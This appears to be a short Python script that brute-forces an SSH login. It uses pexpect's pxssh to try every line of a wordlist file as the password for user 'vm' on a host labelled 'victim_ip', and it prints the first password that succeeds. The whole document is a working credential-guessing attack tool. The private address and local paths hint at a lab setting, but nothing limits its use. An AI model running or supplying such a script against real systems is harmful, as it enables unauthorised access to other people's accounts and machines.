import hashlib
import time
import itertools, string

from pexpect import pxssh
from pexpect.pxssh import ExceptionPxssh

victim_ip = '192.168.1.35'
victim_username = 'vm'
wordlist_path = "/home/jakobshnider/wordlist/cut_wordlist.txt"

with open(wordlist_path, encoding="utf-8", errors="ignore") as wordlist_file:
    cur_wordlist = wordlist_file.readlines()
    for word in cur_wordlist:
        try:
            s = pxssh.pxssh()
            s.login (victim_ip, victim_username, word)
            print("SSH session login successful")
            print(word)
            s.logout()
            break
        except ExceptionPxssh as e:
            print("SSH session failed on login.")
